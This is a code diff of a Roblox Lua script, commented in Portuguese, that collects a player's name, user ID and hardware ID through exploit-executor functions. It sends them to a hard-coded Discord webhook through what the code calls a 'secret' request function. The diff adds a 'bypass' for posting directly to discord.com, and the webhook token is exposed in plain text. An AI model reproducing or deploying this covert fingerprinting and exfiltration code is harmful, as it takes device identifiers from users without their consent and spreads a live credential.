@@ -1,34 +1,35 @@
--- Salve este código completo no seu arquivo do GitHub
-local HttpService = game:GetService("HttpService")
+-- [VERSÃO SEPARADA - APENAS WEBHOOK COM BYPASS PARA O GIT]
 local Players = game:GetService("Players")
 local L_Player = Players.LocalPlayer
 
--- Sua URL oficial e estável protegida na nuvem
-local webhookURL = "https://hooks.hyra.io/api/webhooks/1512877333688614942/xGtPbt9mfc8I0WR11dwsCMlaSdMPaKtOsdMjd8C9ME8cSvxrwcRPnDNUa3NRena_wufG?thread_id=1512876677326438601"
+local webhookURL = "https://discord.com/api/webhooks/1512877333688614942/xGtPbt9mfc8I0WR11dwsCMlaSdMPaKtOsdMjd8C9ME8cSvxrwcRPnDNUa3NRena_wufG?thread_id=1512876677326438601"
 
--- Captura o HWID do executor do infrator
-local function getPlayerHWID()
-    if gethwid then return gethwid()
-    elseif syn and syn.get_hwid then return syn.get_hwid()
-    elseif fluxus and fluxus.gethwid then return fluxus.gethwid()
+local hwid = "Unavailable"
+pcall(function()
+    if syn and syn.gethwid then
+        hwid = syn.gethwid()
+    elseif gethwid then
+        hwid = gethwid()
+    elseif fluxus and getgenv and getgenv().fluxus then
+        hwid = tostring(getgenv().fluxus.HWID or "Unavailable")
+    elseif delta and get_hw_id then
+        hwid = tostring(get_hw_id())
     end
-    return "Não suportado pelo executor"
-end
+end)
 
--- Montagem estruturada do Webhook
 local embedData = {
     ["embeds"] = {{
-        ["title"] = "🛑 HWID LOG - BANNED PERSON HWID",
-        ["color"] = 16711680, -- Vermelho
+        ["title"] = "🛑 HWID LOG - BANNED PERSON HWID (for device ban)",
+        ["color"] = 16711680,
         ["fields"] = {
             {
-                ["name"] = "{ Username/Display  Name }",
-                ["value"] = string.format("Display Name: %s\nUsername: @%s", L_Player.DisplayName, L_Player.Name),
+                ["name"] = "{ Username/Display Name }",
+                ["value"] = string.format("Display Name: %s\nUsername: @%s\nID: %s", L_Player.DisplayName, L_Player.Name, tostring(L_Player.UserId)),
                 ["inline"] = false
             },
             {
                 ["name"] = "{ HWID }",
-                ["value"] = string.format("`%s`", getPlayerHWID()), -- Crases prontas para copiar com clique duplo
+                ["value"] = string.format("`%s`", hwid),
                 ["inline"] = false
             },
             {
@@ -41,7 +42,15 @@ local embedData = {
     }}
 }
 
--- Executa o disparo de forma isolada e segura
-pcall(function()
-    HttpService:PostAsync(webhookURL, HttpService:JSONEncode(embedData), Enum.HttpContentType.ApplicationJson)
-end)
+-- Função de envio secreta do executor
+local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+if req then
+    pcall(function()
+        req({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(embedData)
+        })
+    end)
+end
